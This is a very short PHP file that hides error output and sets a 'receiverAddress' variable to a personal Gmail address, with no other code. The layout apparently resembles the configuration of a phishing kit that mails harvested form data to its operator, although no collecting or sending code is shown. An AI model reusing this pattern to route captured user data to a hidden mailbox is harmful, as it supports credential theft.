<?php

ini_set('display_errors', 0);
$receiverAddress = "donaldmarius65@gmail.com";


?>